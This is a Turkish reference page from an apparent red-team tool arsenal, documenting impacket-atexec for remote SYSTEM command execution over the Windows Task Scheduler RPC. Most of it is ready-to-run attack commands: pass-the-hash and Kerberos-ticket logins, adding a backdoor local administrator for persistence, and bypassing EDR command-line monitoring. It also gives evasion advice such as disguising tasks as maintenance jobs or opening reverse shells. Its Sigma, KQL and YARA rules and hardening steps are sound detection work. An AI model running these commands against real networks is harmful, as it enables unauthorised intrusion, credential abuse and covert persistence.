# impacket-atexec

> **Kategori:** [11. YANAL HAREKET VE UZAK KOD YÜRÜTME (LATERAL MOVEMENT & EXECUTION)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Microsoft Task Scheduler (MS-TSCH) RPC arayüzü üzerinden uzak sistemde geçici zamanlanmış görev tanımlayarak NT AUTHORITY\SYSTEM yetkisinde komut yürüten ve çıktıları SMB üzerinden okuyan Impacket yanal hareket aracı.

---

## 1. Genel Bakış ve Amaç

`impacket-atexec` (veya `atexec.py`), Fortra/SecureAuth Impacket araç takımı içerisinde yer alan ve Windows Görev Zamanlayıcı (Task Scheduler) RPC arayüzünü ([MS-TSCH]) kullanarak uzak sistemlerde komut çalıştırmayı sağlayan özel bir yanal hareket aracıdır.

Active Directory ortamlarında yanal hareket gerçekleştirirken `psexec` ve `smbexec` yöntemleri Windows Servis Kontrol Yöneticisi'ni (SCM) manipüle eder ve `System Event ID 7045` üretir. `wmiexec` ise DCOM ve WMI arayüzüne dayanır. Ancak bazı sıkılaştırılmış ortamlarda WMI ve SCM servisleri kısıtlanmış veya sıkı EDR kurallarıyla engellenmiş olabilir. `impacket-atexec`, üçüncü bir alternatif vektör sunarak doğrudan Görev Zamanlayıcı servisine (`Schedule` / `svchost.exe`) yönelir.

atexec, hedef makinenin SMB (TCP 445) veya doğrudan RPC uç noktasına bağlanarak `\PIPE\atsvc` veya `\PIPE\taskschedule` adlandırılmış borusu üzerinden `SchRpcRegisterTask` RPC çağrısı yapar. Bu çağrı ile hedefte anında çalıştırılmak üzere geçici bir XML tabanlı zamanlanmış görev tanımlanır. Görev, `NT AUTHORITY\SYSTEM` güvenlik bağlamında çalışır ve komut çıktısını `C:\Windows\Temp\` dizini altındaki geçici bir dosyaya yönlendirir. atexec görevi tetikler (`SchRpcRun`), tamamlanmasını bekler, çıktıyı SMB üzerinden okuyup ekrana basar ve ardından hem zamanlanmış görevi hem de geçici çıktı dosyasını sistemden siler.

```
+-------------------------------------------------------------------------+
|                       impacket-atexec Mimari Akışı                      |
+-------------------------------------------------------------------------+
                               |
               Linux Operatörü (Kali / C2 Host)
         [atexec.py corp.local/admin:pass@192.168.1.15 "whoami"]
                               v
                     +--------------------+
                     | atexec.py Engine   |
                     +--------------------+
                               |
               1. SMB RPC (\PIPE\atsvc veya \PIPE\taskschedule)
               SchRpcRegisterTask(TaskDefinition: XML)
                               v
                +------------------------------+
                | Task Scheduler Service       |
                | (svchost.exe -k netsvcs)     |
                +------------------------------+
                               |
               2. SchRpcRun(TaskName)
               (Görev Anında Tetiklenir)
                               |
                               +-> taskhostw.exe / svchost.exe
                                   cmd.exe /C whoami > C:\Windows\Temp\__out
                               |
               3. SchRpcGetLastRunInfo()
               (Görevin Tamamlandığı Doğrulanır)
                               |
               4. SMB ReadFile(\\Target\ADMIN$\Temp\__out)
               [Çıktı Linux Konsoluna Aktarılır]
                               |
               5. İzlerin Silinmesi:
                  - SchRpcDelete(TaskName)
                  - SMB DeleteFile(Temp\__out)
```

### 1.1 MS-TSCH Protokolü ve Yürütme Mimarisi
* **Task Scheduler 2.0 (XML Tabanlı):** Modern Windows sistemlerinde görevler XML şeması ile tanımlanır. Görevin `Principal` bölümünde `UserId="S-1-5-18"` (`NT AUTHORITY\SYSTEM`) ve `LogonType="ServiceAccount"` atanarak en üst yetki elde edilir.
* **Geriye Dönük Uyumluluk (Legacy AT Service):** Eski Windows sürümlerinde (Windows XP/2003) NetrJobAdd API fonksiyonu (`\PIPE\atsvc`) kullanılır. Modern Windows sürümlerinde ise otomatik olarak `\PIPE\taskschedule` arayüzüne geçiş yapılır.

### 1.2 Zamanlanmış Görev Yaşam Döngüsü ve RPC Çağrı Adımları
atexec, komut çalıştırma sürecini 4 temel RPC metodu üzerinden yürütür:
1. **Görev Kaydı (`SchRpcRegisterTask`):** `Actions` bloğunda `%COMSPEC% /C <komut> > C:\Windows\Temp\<rastgele>.tmp 2>&1` komutunu barındıran geçici bir XML yapısı SCM Task Scheduler veritabanına kaydedilir.
2. **Anlık Tetikleme (`SchRpcRun`):** Zamanlanmış bir tetikleyici (trigger) beklenmeden görev hemen başlatılır; `svchost.exe` (Schedule) alt süreç olarak `cmd.exe` türetir.
3. **Durum Yoklama (`SchRpcGetLastRunInfo`):** İstemci, görevin tamamlanıp tamamlanmadığını ve çıkış kodunu (`ExitCode: 0`) düzenli aralıklarla sorgular.
4. **Temizlik (`SchRpcDelete`):** Görev tamamlandıktan sonra kayıt derhal silinir, ardından SMB üzerinden `C:\Windows\Temp\` altındaki çıktı dosyası okunup kaldırılır.

### Neden Önemli?

| Senaryo / İhtiyaç | Operasyonel Açıklama |
|---|---|
| **SCM ve WMI Kısıtlamalarını Atlama** | Servis oluşturmanın (Event ID 7045) veya WMI DCOM çağrılarının engellendiği ağlarda alternatif yürütme kanalı. |
| **Doğrudan SYSTEM Ayrıcalığı** | Görev Zamanlayıcı tarafından başlatılan görevler doğrudan yerel `SYSTEM` yetkisiyle çalışır. |
| **Pass-the-Hash ve Kerberos Uyumluluğu** | Açık metin parola olmadan NTLM hash veya Kerberos biletleri (`.ccache`) ile sorunsuz kimlik doğrulama. |
| **Hızlı ve Atomik Yürütme** | Sürekli çalışan bir kabuk yerine tek komutluk görev tanımlayıp, çalıştırıp, temizleyen atomik yapı. |
| **Kurumsal Görev Trafiğinde Gizlenme** | Kurumsal sistemlerde sürekli zamanlanmış görev çalıştığı için trafik anomalisini en aza indirme. |

### Alternatif Araçlarla Karşılaştırma

| Özellik / Boyut | impacket-atexec | impacket-psexec | impacket-wmiexec | NetExec (--exec-method atexec) |
|---|---|---|---|---|
| **Yürütme Protokolü** | Task Scheduler (MS-TSCH) | SCM (svcctl) | DCOM (Win32_Process) | Task Scheduler RPC |
| **Servis Oluşturma** | Hayır | Evet (Event ID 7045) | Hayır | Hayır |
| **Oluşturulan Görev İzi** | Evet (Event ID 4698) | Hayır | Hayır | Evet (Event ID 4698) |
| **Kullanıcı Bağlamı** | `NT AUTHORITY\SYSTEM` | `NT AUTHORITY\SYSTEM` | Çağıran Kullanıcı | `NT AUTHORITY\SYSTEM` |
| **Çalışma Modu** | Tek Komutluk (Non-interactive) | Tam İnteraktif | Yarı-interaktif | Tek Komutluk |
| **Gereken Portlar** | TCP 445 / 139 | TCP 445 | TCP 135 + Dinamik RPC | TCP 445 |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

`impacket-atexec`, tek komut yürütme odaklı tasarlandığı için parametre yapısında çalıştırılacak komut zorunlu argümandır.

### Genel Sözdizimi
```bash
impacket-atexec [[etki_alanı/]kullanıcı[:parola]@]<hedef_ip_veya_fqdn> "<komut>" [Seçenekler]
```

### Kritik Parametreler Tablosu

| Parametre | Bayrak | Açıklama | Örnek Değer |
|---|---|---|---|
| Hedef / Kimlik | `[domain/]user:pass@host` | Etki alanı, kullanıcı adı, parola ve hedef adresi. | `corp.local/admin:Pass!@10.0.0.1` |
| Komut Dizesi | `"<komut>"` | Hedef makinede SYSTEM olarak koşturulacak komut. | `"whoami /all"` |
| Pass-the-Hash | `-hashes` | NTLM hash ile kimlik doğrulama (`LMHASH:NTHASH`). | `-hashes :51a26b735c02dc...` |
| Kerberos Auth | `-k` | Kerberos kimlik doğrulaması kullanır (`KRB5CCNAME`). | *Argümansız bayrak* |
| Parolasız Mod | `-no-pass` | Parola sorma promptunu atlar. | *Argümansız bayrak* |
| KDC IP Adresi | `-dc-ip` | Kerberos KDC denetleyicisi IP'si. | `-dc-ip 10.0.0.1` |
| Hedef IP Zorlama | `-target-ip` | Kerberos FQDN bilet talebinde doğrudan soket IP'sini belirtir. | `-target-ip 192.168.1.15` |
| Sessiz Komut | `-silentcommand` | `cmd.exe /C` sarmalamasını kaldırıp komutu yalın çalıştırır. | *Argümansız bayrak* |
| Karakter Kodlaması| `-codec` | Çıktı karakter kodlaması (Türkçe sistemler için `cp1254`). | `-codec cp1254` |
| Zaman Damgası | `-ts` | Konsola basılan her çıktı satırına anlık zaman damgası ekler. | *Argümansız bayrak* |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Etki Alanı Yöneticisi ile Uzak Sistemde SYSTEM Bilgisi Alma
Standart etki alanı yöneticisi kimlik bilgileriyle hedef sunucuda Task Scheduler üzerinden komut koşturup çıktısını konsola basma.

```bash
impacket-atexec corp.local/da_admin:P@ssword2026!@192.168.1.15 "whoami /all"
```

**Örnek Konsol Çıktısı:**
```text
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Connecting to 192.168.1.15:445
[*] Authenticating as corp.local\da_admin...
[+] Authentication successful!
[*] Connecting to Task Scheduler RPC service...
[*] Creating scheduled task with XML definition...
[+] Task created successfully! Name: Impacket_KjHg
[*] Triggering task execution...
[*] Waiting for task completion...
[+] Task finished! ExitCode: 0
[*] Retrieving output from \\192.168.1.15\ADMIN$\Temp\KjHg.tmp...

USER INFORMATION
----------------
User Name: nt authority\system

GROUP INFORMATION
-----------------
Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
NT AUTHORITY\SYSTEM                    Well-known group S-1-5-18     Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                 Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group

[*] Deleting scheduled task Impacket_KjHg...
[*] Deleting temporary output file...
[+] Clean up completed.
```

### Senaryo 2: Pass-the-Hash (NTLM Hash) ile Servis Hesabı Üzerinden Komut Koşturma
Parolası bilinmeyen bir yerel yöneticinin NTLM hash'i ile oturum açarak hedef sunucuda IP yapılandırmasını kontrol etme.

```bash
impacket-atexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 Administrator@192.168.1.20 "ipconfig /all"
```

### Senaryo 3: Kerberos Bileti (.ccache) ile Pass-the-Ticket Yanal Hareketi
Linux bilet önbelleğindeki Kerberos biletini kullanarak NTLM trafiği üretmeden doğrudan Kerberos ile görev zamanlayıcı üzerinden kod yürütme.

```bash
export KRB5CCNAME=/tmp/da_admin.ccache
impacket-atexec -k -no-pass -dc-ip 192.168.1.10 CORP.LOCAL/da_admin@FS01.corp.local "hostname"
```

### Senaryo 4: Uzak Sistemde Yeni Yerel Yönetici Kullanıcısı Ekleme
Hedef makinede kalıcılık sağlamak amacıyla doğrudan SYSTEM yetkisiyle yeni bir yerel kullanıcı oluşturup `Administrators` grubuna ekleme.

```bash
impacket-atexec corp.local/da_admin:P@ssword2026!@192.168.1.15 "net user secops P@ss2026! /add && net localgroup administrators secops /add"
```

### Senaryo 5: PowerShell Komutu ile Savunma Mekanizmasını Sorgulama
Hedef makinede çalışan antivirüs ve koruma durumunu PowerShell üzerinden tek satırda sorgulama.

```bash
impacket-atexec corp.local/da_admin:P@ssword2026!@192.168.1.15 "powershell.exe -c Get-Service WinDefend"
```

### Senaryo 6: Sessiz Mod (-silentcommand) ile cmd.exe Sarmalamasını Kaldırma
EDR komut satırı izleme kurallarını atlatmak için `cmd.exe /C` sarmalamasını kaldırarak komutu doğrudan çalıştırma.

```bash
impacket-atexec corp.local/da_admin:P@ssword2026!@192.168.1.15 -silentcommand "whoami"
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Belirti | Olası Neden | Kesin Çözüm Adımı |
|---|---|---|
| `[-] Task Scheduler Error: Access is denied. (0x80070005)` | Kullanıcının hedef makinede Görev Zamanlayıcı üzerinde görev oluşturma yetkisi yok veya Remote UAC devrede. | Kullanıcının yerel `Administrators` grubunda olduğunu doğrulayın; etki alanı yöneticisi hesabı kullanın. |
| `[-] SMB SessionError: STATUS_OBJECT_NAME_NOT_FOUND` | Komut çıktısını `C:\Windows\Temp\` dizinine yazamadı veya dosya okunamadan silindi. | Hedef diskte yer olup olmadığını kontrol edin veya doğrudan çıktısız komut çalıştırmayı deneyin. |
| `[-] Error connecting to Task Scheduler: STATUS_PIPE_NOT_AVAILABLE` | `\PIPE\atsvc` veya `\PIPE\taskschedule` borusu güvenlik yazılımı veya yerel ilkeler tarafından kapatılmış. | Görev Zamanlayıcı servisi devre dışı olabilir; WMI tabanlı `impacket-wmiexec` alternatifini tercih edin. |
| `Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN` | Hedef makinenin SPN kaydı Active Directory KDC'de bulunamadı. | Hedef IP yerine FQDN (`FS01.corp.local`) kullanın ve `-dc-ip` ile çalışan bir DC belirtin. |
| `Task run failed: The task is already running` | Hedef makinede daha önce aynı isimle oluşturulmuş bir görev kilitli kalmış. | Görevin tamamlanmasını bekleyin veya `impacket-wmiexec` ile kilitlenen görevi `schtasks /delete` ile silin. |
| `[-] Codec error: 'charmap' codec can't decode byte...` | Hedef sistem standart dışı dil kodlaması kullanıyor (Örn: Türkçe Windows). | `-codec cp1254` parametresi ekleyerek karakter kodlamasını Türkçe Windows için zorlayın. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

impacket-atexec, servis oluşturmadığı (`Event ID 7045` üretmediği) için SCM tabanlı tespitleri atlatır. Ancak Windows Güvenlik Günlüklerinde ve Görev Zamanlayıcı Operasyonel Günlüklerinde **Zamanlanmış Görev Yaşam Döngüsü** olaylarını üretir.

```
[impacket-atexec Yürütmesi]
          │
          ├──> RPC Görev Kaydı (SchRpcRegisterTask) ──> Security Event ID 4698 (A scheduled task was created)
          │                                            TaskName: Impacket_XXXX, User: SYSTEM
          │
          ├──> Görevin Başlatılması (SchRpcRun) ──────> TaskScheduler Operational ID 100/106
          │                                            Security Event ID 4702 (A scheduled task was updated)
          │
          ├──> cmd.exe Sürecinin Türetilmesi ─────────> Sysmon Event ID 1 (Process Creation)
          │                                            ParentImage: svchost.exe / taskhostw.exe -> cmd.exe
          │
          ├──> Çıktı Dosyasının Oluşturulması ────────> Sysmon Event ID 11 (FileCreate: C:\Windows\Temp\*.tmp)
          │
          └──> Görevin ve Dosyanın Silinmesi ──────────> Security Event ID 4699 (A scheduled task was deleted)
                                                       Sysmon Event ID 23 (FileDelete)
```

### 5.1 Bırakılan İzler ve Olay Günlükleri
* **Security Event ID 4698 (A scheduled task was created):** Görev Zamanlayıcı üzerinde yeni bir görev tanımlandığında oluşturulur. `TaskContent` XML'inde çalıştırılan komut dizesi ve `UserId: S-1-5-18` (SYSTEM) açıkça loglanır.
* **Security Event ID 4699 (A scheduled task was deleted):** İşlem bittikten hemen sonra atexec görevi sildiği için 4698'den birkaç saniye sonra 4699 olayı üretilir. Bu "Kısa Ömürlü Görev" (Ephemeral Task) anomalisi SIEM için güçlü bir tespittir.
* **TaskScheduler Operational Log (Event ID 106 & 140):** Görevin başarıyla başlatıldığı ve tamamlandığı bilgisi `Microsoft-Windows-TaskScheduler/Operational` günlüğünde tutulur.
* **Sysmon Event ID 1 (Process Creation):** `ParentImage: taskhostw.exe` veya `svchost.exe` tarafından `cmd.exe /C ... > C:\Windows\Temp\` komutunun başlatılması.

### 5.2 MITRE ATT&CK Eşleştirmesi

| Taktik | Teknik ID | Teknik Adı | Operasyonel Kullanım |
|---|---|---|---|
| **Execution** | [T1053.005](https://attack.mitre.org/techniques/T1053/005/) | Scheduled Task | Task Scheduler RPC arayüzü ile komut yürütme. |
| **Execution** | [T1059.003](https://attack.mitre.org/techniques/T1059/003/) | Windows Command Shell | `cmd.exe` üzerinden komut işletimi. |
| **Lateral Movement** | [T1021.002](https://attack.mitre.org/techniques/T1021/002/) | SMB/Windows Admin Shares | Çıktı yakalama amacıyla SMB paylaşımının kullanımı. |
| **Privilege Escalation** | [T1053.005](https://attack.mitre.org/techniques/T1053/005/) | Scheduled Task | Görevi `SYSTEM` güvenlik bağlamında çalıştırarak yetki yükseltme. |
| **Defense Evasion** | [T1070.004](https://attack.mitre.org/techniques/T1070/004/) | File Deletion | Çıktı dosyasının ve zamanlanmış görevin silinmesi. |

### 5.3 OPSEC Risk ve Önlem Tablosu

| Tespit Riski | Teknik Sebebi | Azaltma / Önlem Stratejisi |
|---|---|---|
| **Ephemeral Task Alarmı** | Görevin oluşturulup 5 saniye içinde silinmesi (Event 4698 -> 4699). | Görevi hemen silmek yerine kurumsal bir bakım görevi kisvesinde uzun süreli zamanlayın veya WMI/DCOM yöntemlerini kullanın. |
| **Temp Dizininde Çıktı Dosyası** | `C:\Windows\Temp\*.tmp` dosyasının FIM tarafından yakalanması. | Çıktı gerektirmeyen durumlarda ters bağlantı (reverse shell) açın veya doğrudan kalıcılık bırakın. |
| **Parent Process Anomalisi** | `taskhostw.exe` veya `svchost.exe`'nin `cmd.exe` çalıştırması. | Komut satırı çalıştırmak yerine meşru bir Windows sistem ikilisini veya DLL'i tetikleyin. |

### 5.4 Tespit Kuralları

#### Sigma Kuralı (Short-Lived Scheduled Task Execution - atexec Pattern)
```yaml
title: Short-Lived Scheduled Task Created and Deleted (atexec)
id: f4e3d2c1-8901-4321-ba98-fedcba543210
status: production
description: Çok kısa süre içinde oluşturulup silinen ve SYSTEM yetkisinde komut çalıştıran zamanlanmış görev tespit edildi.
logsource:
  product: windows
  service: security
detection:
  selection_create:
    EventID: 4698
  selection_delete:
    EventID: 4699
  timeframe: 30s
  condition: selection_create and selection_delete
falsepositives:
  - Bazı kurumsal yazılım güncelleme otomasyonları (SCCM, Google Update)
level: high
```

#### Microsoft Sentinel KQL Sorgusu
```kql
SecurityEvent
| where EventID == 4698
| extend TaskData = tostring(EventData)
| where TaskData has "C:\\Windows\\Temp\\" and (TaskData has "cmd.exe" or TaskData has "powershell.exe")
| project TimeGenerated, Computer, SubjectUserName, TaskName = extract("<TaskName>(.*?)</TaskName>", 1, TaskData)
| order by TimeGenerated desc
```

#### YARA Kuralı
```yara
rule Impacket_ATExec_Script_Artifact {
    meta:
        description = "impacket-atexec Python script statik tespiti"
        author = "Antigravity Active Directory Project"
        date = "2026-10-14"
        reference = "https://github.com/fortra/impacket"
    strings:
        $s1 = "atexec" ascii wide nocase
        $s2 = "SchRpcRegisterTask" ascii
        $s3 = "SchRpcRun" ascii
        $s4 = "SchRpcDelete" ascii
        $s5 = "Task Scheduler" ascii wide
    condition:
        3 of ($s*)
}
```

### 5.5 Savunma Karşılığı ve Sertleştirme (Hardening)
* **Zamanlanmış Görev Denetimi (Audit Scheduled Task):** Group Policy üzerinden `Audit Other Object Access Events` altındaki `Audit Scheduled Task` politikası etkinleştirilmeli; Event ID 4698, 4699, 4700 ve 4702 günlükleri SIEM'de korelasyona tabi tutulmalıdır.
* **Ağ İzolasyonu ve RPC Filtreleme:** İstemciler arası (workstation-to-workstation) SMB (TCP 445) ve RPC trafiği Windows Defender Firewall ile engellenmelidir.
* **Remote UAC ve En Az Yetki:** `LocalAccountTokenFilterPolicy = 0` tutularak yerel hesapların uzaktan Görev Zamanlayıcı API'lerine erişimi kısıtlanmalıdır.
* **Temp Dizini Yürütme Kısıtlamaları:** `C:\Windows\Temp` ve kullanıcı geçici dizinlerinden script veya ikili çalıştırılması AppLocker / Software Restriction Policies ile yasaklanmalıdır.
* **Task Scheduler Servis İzinlerinin Sıkılaştırılması:** `sc sdset Schedule` ile uzaktan görev kaydetme ve çalıştırma izinleri yalnızca Domain Admins ve kurumsal yönetim servislerine tahsis edilmelidir.
* **Process Creation ve Script Block Logging:** Zamanlanmış görevler tarafından tetiklenen süreçlerin komut satırı argümanları için Sysmon Event ID 1 ve PowerShell Event ID 4104 günlüklemesi zorunlu tutulmalıdır.

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Hızlı Referans / Cheat Sheet)

```bash
# 1. Standart Parola ile SYSTEM Yetkisinde Komut Çalıştırma
impacket-atexec corp.local/da_admin:P@ssword2026!@192.168.1.15 "whoami /all"

# 2. Pass-the-Hash (NTLM Hash) ile Uzaktan Komut Koşturma
impacket-atexec -hashes :51a26b735c02dcda234b21651d30f7b1 Administrator@192.168.1.15 "hostname"

# 3. Kerberos Bileti (.ccache) ile Parolasız Komut Yürütme
export KRB5CCNAME=/tmp/da_admin.ccache && impacket-atexec -k -no-pass -dc-ip 192.168.1.10 CORP.LOCAL/da_admin@FS01.corp.local "ipconfig"

# 4. Yerel Administrator Hesabı ile Oturum Açma
impacket-atexec ./Administrator:LocalAdminPass!@192.168.1.20 "net user"

# 5. PowerShell Komutu Çalıştırma ve Çıktıyı Alma
impacket-atexec corp.local/admin:Pass!@192.168.1.15 "powershell.exe -c Get-Service WinDefend"

# 6. Sessiz Mod ile cmd.exe /C Sarmalamasını Kaldırma
impacket-atexec corp.local/admin:Pass!@192.168.1.15 -silentcommand "whoami"

# 7. Konsol Çıktısına Zaman Damgası Ekleme
impacket-atexec corp.local/admin:Pass!@192.168.1.15 -ts "tasklist /svc"

# 8. Türkçe Karakter Kodlaması ile Komut Koşturma
impacket-atexec corp.local/admin:Pass!@192.168.1.15 -codec cp1254 "net localgroup administrators"

# 9. Hedef IP Zorlayarak Kerberos ile Komut Yürütme
impacket-atexec -k -no-pass -target-ip 192.168.1.15 CORP.LOCAL/admin@FS01.corp.local "whoami"

# 10. Yeni Yerel Kullanıcı Oluşturup Yönetici Grubuna Ekleme
impacket-atexec corp.local/admin:Pass!@192.168.1.15 "net user secadmin P@ss123! /add && net localgroup administrators secadmin /add"
```

### Komut Detay Analizleri

#### 1. Standart Parola ile SYSTEM Yetkisinde Komut Çalıştırma
* **Ne Yapar?:** Hedef makinede Task Scheduler RPC arayüzü ile geçici görev açar, `whoami /all` komutunu `SYSTEM` olarak çalıştırır, sonucu ekrana basar ve görevi siler.
* **Ne Zaman Kullanılır?:** SCM servis oluşturmanın engellendiği ortamlarda SYSTEM yetkisinde hızlı durum kontrolü yapmak için.
* **Parametreler:**
  * `corp.local/da_admin:P@ssword2026!`: Etki alanı kimlik bilgileri.
  * `"whoami /all"`: Yürütülecek işletim sistemi komutu.

#### 2. Pass-the-Hash (NTLM Hash) ile Uzaktan Komut Koşturma
* **Ne Yapar?:** Açık parola gerekmeden NTLM hash ile kimlik doğrulayarak Task Scheduler üzerinden komut yürütür.
* **Ne Zaman Kullanılır?:** Hash ele geçirildiğinde ve parola kırılamadığında.
* **Parametreler:**
  * `-hashes :<NTHASH>`: NTLM hash değeri.

#### 3. Kerberos Bileti (.ccache) ile Parolasız Komut Yürütme
* **Ne Yapar?:** Linux bilet önbelleğindeki Kerberos biletini kullanarak NTLM trafiği oluşturmadan hedefte görev zamanlar.
* **Ne Zaman Kullanılır?:** NTLM izleme alarmlarını tetiklememek için.
* **Parametreler:**
  * `-k`: Kerberos kimlik doğrulaması.
  * `-no-pass`: Parola sorma adımını atlar.

#### 4. Yerel Administrator Hesabı ile Oturum Açma
* **Ne Yapar?:** Etki alanı yerine makinenin yerel SAM veritabanındaki hesapla kimlik doğrular.
* **Ne Zaman Kullanılır?:** LAPS veya yerel yönetici parolası bilinen bağımsız sistemlerde.
* **Parametreler:**
  * `./Administrator`: Yerel kullanıcı bağlamı.

#### 5. PowerShell Komutu Çalıştırma ve Çıktıyı Alma
* **Ne Yapar?:** `cmd.exe` yerine doğrudan `powershell.exe` yorumlayıcısını çağırarak PowerShell cmdlet'lerini işletir.
* **Ne Zaman Kullanılır?:** Gelişmiş sistem yönetimi veya savunma durumu sorguları için.
* **Parametreler:**
  * `"powershell.exe -c ..."`: Çalıştırılacak PowerShell betiği.

#### 6. Sessiz Mod ile cmd.exe /C Sarmalamasını Kaldırma
* **Ne Yapar?:** Komutun `cmd.exe /C` ile sarmalanmasını önler; doğrudan belirtilen ikiliyi çalıştırır.
* **Ne Zaman Kullanılır?:** EDR komut satırı inceleme kurallarını yanıltmak için.
* **Parametreler:**
  * `-silentcommand`: Komut sarmalama bayrağını kaldırır.

#### 7. Konsol Çıktısına Zaman Damgası Ekleme
* **Ne Yapar?:** Ekrana basılan her çıktı satırının başına kesin zaman damgası ekler.
* **Ne Zaman Kullanılır?:** Sızma testi ve operasyon kayıtlarında zaman çizelgesi (timeline) oluştururken.
* **Parametreler:**
  * `-ts`: Timestamp ekleme bayrağı.

#### 8. Türkçe Karakter Kodlaması ile Komut Koşturma
* **Ne Yapar?:** Türkçe Windows sistemlerinden dönen çıktılardaki karakter bozulmalarını engeller.
* **Ne Zaman Kullanılır?:** Çıktıların okunabilirliğini korumak için.
* **Parametreler:**
  * `-codec cp1254`: Windows-1254 Türkçe kodlaması.

#### 9. Hedef IP Zorlayarak Kerberos ile Komut Yürütme
* **Ne Yapar?:** FQDN adına bilet talep ederken doğrudan hedef IP'ye ağ bağlantısı kurar.
* **Ne Zaman Kullanılır?:** DNS çözümleme sorunlarında.
* **Parametreler:**
  * `-target-ip 192.168.1.15`: Hedef IP adresi.

#### 10. Yeni Yerel Kullanıcı Oluşturup Yönetici Grubuna Ekleme
* **Ne Yapar?:** Hedef makinede yeni bir yerel hesap oluşturur ve onu `Administrators` grubuna ekler.
* **Ne Zaman Kullanılır?:** Yanal hareket sonrasında hedefte kalıcılık sağlamak için.
* **Parametreler:**
  * `net user ... /add && net localgroup administrators ... /add`.

---

## Kaynaklar
* [Impacket Resmi GitHub Deposu](https://github.com/fortra/impacket)
* [Microsoft Open Specifications: [MS-TSCH] Task Scheduler Service Remote Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/)
* [MITRE ATT&CK: Scheduled Task (T1053.005)](https://attack.mitre.org/techniques/T1053/005/)
* [SpecterOps Blog: Threat Hunting for Ephemeral Scheduled Tasks](https://posts.specterops.io/)
* [SANS Reading Room: Detecting Scheduled Task Lateral Movement with Windows Security Logs](https://www.sans.org/white-papers/)

---

> **Önceki:** [← impacket-wmiexec](./impacket-wmiexec.md) · **Sonraki:** [impacket-dcomexec →](./impacket-dcomexec.md)
